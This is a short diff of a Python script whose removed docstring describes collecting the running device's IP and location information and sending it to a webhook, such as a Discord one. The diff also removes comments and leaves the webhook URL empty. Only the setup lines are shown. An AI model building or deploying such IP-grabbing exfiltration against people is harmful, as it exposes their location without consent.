@@ -1,11 +1,6 @@
-"""
-This Script gets IP and its information of the device where it was executed
-the script also send data to webhook (recomend to use discord webhook)
-"""
 import requests
 
-hurl = "" # put your webhook url here
-
+hurl = ""
 
 # Dont touch
 url = "http://ip-api.com/json/"
